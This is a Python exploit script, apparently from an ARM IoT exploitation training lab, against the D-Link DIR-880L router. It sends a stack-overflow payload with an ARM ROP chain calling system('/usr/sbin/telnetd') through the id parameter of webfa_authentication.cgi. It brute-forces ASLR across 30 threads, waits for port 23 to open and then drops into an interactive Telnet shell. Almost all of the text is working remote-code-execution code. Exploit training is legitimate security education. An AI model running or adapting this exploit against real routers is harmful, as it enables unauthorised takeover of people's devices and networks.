#!/usr/bin/python
#
# The ARM IoT Exploit Laboratory
# by Saumil Shah
#
# Exploit template for DLINK DIR-880L router

from telnetlib import Telnet
from time import sleep
import struct, sys, re, socket, threading

##### HELPER FUNCTIONS #####

def pack32(value):
    return struct.pack("<I", value)  # little byte order

def pack16n(value):
    return struct.pack(">H", value)  # big/network byte order

def urlencode(buf):
    s = ""
    for b in buf:
        if re.match(r"[a-zA-Z0-9\/]", b) is None:
            s += "%%%02X" % ord(b)
        else:
            s += b
    return s

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called libc_base
def libc(offset):
    return pack32(libc_base + offset)

# function to represent data on the stack
def data(data):
    return pack32(data)

# function to check for bad characters
# run this before sending out the payload
# e.g. detect_badchars(payload, "\x00\x0a\x0d/?")
def detect_badchars(string, badchars):
    for badchar in badchars:
        i = string.find(badchar)
        while i != -1:
            sys.stderr.write("[!] 0x%02x appears at position %d\n" % (ord(badchar), i))
            i = string.find(badchar, i+1)

##### MAIN #####

def check(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, 23))
        return True
    except:
        return False

def brute(ip, port):
    global expl_successful

    while expl_successful == False:

        buf = "A" * 408

        #libc_base = 0x4000e000
        #libc_base = 0x400d7000
        libc_base = 0x400e7000

        bx_sp = pack32(libc_base + 0x61d5)
        pop_r3_pc = pack32(libc_base + 0x00018298)
        mov_r0_sp_blx_r3 = pack32(libc_base + 0x00040cb8)
        system = pack32(libc_base + 0x5a270)


        # building the actual rop chain
        # Good ressource: https://fidusinfosec.com/remote-code-execution-cve-2018-5767/
        chain =  pop_r3_pc
        chain += system
        chain += mov_r0_sp_blx_r3
        chain += "/usr/sbin/telnetd"
        chain += ";abc"


        #buf += pack32(0x42424242)
        buf += chain


        buf += "C"*(80-len(chain))

        detect_badchars(buf, "\x00")

        id_param = urlencode(buf)
        uri = "/webfa_authentication.cgi?id=%s&password=x" % id_param

        request = "GET %s HTTP/1.0\n\n" % uri
        #print request,

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send(request)
        except:
            pass



def main():
    if len(sys.argv) != 3:
        print("Usage: {} <ip> <port>".format(sys.argv[0]))
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]


    global expl_successful
    expl_successful = False

    print("[+] Running exploit against {}:{}".format(ip, port))
    print("[*] Wait a bit, we're bruting ASLR...")

    threads = []
    for i in range(0, 30):
        t = threading.Thread(target=brute, args=(ip, port))
        t.start()
        threads.append(t)


    while expl_successful == False:
        expl_successful = check(ip)

    print("[+] Exploit successful! Enjoy your shell.")
    
    tn = Telnet(ip)
    tn.interact()


main()
